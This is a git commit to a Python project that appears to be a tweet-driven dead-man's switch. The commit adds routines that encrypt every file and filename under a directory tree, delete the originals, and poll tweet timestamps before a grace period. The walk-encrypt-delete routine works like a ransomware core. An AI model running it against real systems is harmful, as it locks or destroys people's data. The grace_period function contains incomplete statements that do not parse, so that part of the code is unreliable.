889a5adbad0886fa9b55a356e1cb4e6ef660294d
dfiel <github@dfiel.com>
2020-02-23 09:19:27 -0500

    Update encryption class and start main logic

--- encryption.py
+++ encryption.py
@@ -1,6 +1,5 @@
 from cryptography.fernet import Fernet
 import os
-import time
 
 
 class Encrypter:
@@ -18,6 +17,26 @@ class Encrypter:
             data = file.read()
         with open(file_path, 'wb') as file:
             file.write(self.crypter.encrypt(data))
+
+    def encrypt_with_name(self, file_path):
+        with open(file_path, 'rb') as file:
+            data = file.read()
+        split_path = os.path.split(file_path)
+        name = self.crypter.encrypt(split_path[1].encode()).decode()
+        new_path = os.path.join(split_path[0], name)
+        with open(new_path, 'wb+') as file:
+            file.write(self.crypter.encrypt(data))
+        os.remove(file_path)
+
+    def decrypt_with_name(self, file_path):
+        with open(file_path, 'rb') as file:
+            data = file.read()
+        split_path = os.path.split(file_path)
+        name = self.crypter.decrypt(split_path[1].encode()).decode()
+        new_path = os.path.join(split_path[0], name)
+        with open(new_path, 'wb+') as file:
+            file.write(self.crypter.decrypt(data))
+        os.remove(file_path)
 
     def decrypt_file(self, file_path):
         with open(file_path, 'rb') as file:
--- main.py
+++ main.py
@@ -20,14 +20,48 @@ def check_tweet_time(tweet_time, check=86400):
     return time.time() - tweet_time < check
 
 
-def traverse_dirs(root_dir, encrypt=False):
+def traverse_dirs(root_dir, encrypt=None, decrypt=None):
     for i in os.walk(root_dir):
         for x in i[2]:
             path = os.path.normpath(os.path.join(os.getcwd(), i[0], x))
             if encrypt:
                 encrypt.encrypt_file(path)
+            elif decrypt:
+                decrypt.decrypt_file(path)
             else:
                 print(path)
+
+
+def tweet_loop(api_refresh=120, tweet_age=86400):
+    wait_time = 0
+    while True:
+        if time.time() - wait_time < api_refresh:
+            time.sleep(1)
+            continue
+        tweet = grab_latest_tweet()
+        wait_time = time.time()
+        if time.time() - tweet[0] < tweet_age:
+            time.sleep(1)
+            continue
+        break
+    print("Timeout reached on tweet. Entering Grace Period.")
+    grace_period()
+
+
+def grace_period(api_refresh=120, timeout=129600):
+    wait_time = 0
+    while True:
+        if time.time() - wait_time < api_refresh:
+            time.sleep(1)
+            continue
+        tweet = grab_latest_tweet()
+        wait_time = time.time()
+        if time.time() - tweet[0]
+        if not check_tweet_time(tweet[0], timeout):
+            if time.time() - tweet[0]
+            time.sleep(1)
+            continue
+
 
 
 def main():
@@ -43,7 +77,4 @@ if __name__ == '__main__':
         system_root = 'TestDir'
     else:
         system_root = '.'
-    latest_tweet = grab_latest_tweet()
-    print(latest_tweet)
-    print(check_tweet_time(latest_tweet[0]))
-    traverse_dirs(system_root)
+    main()
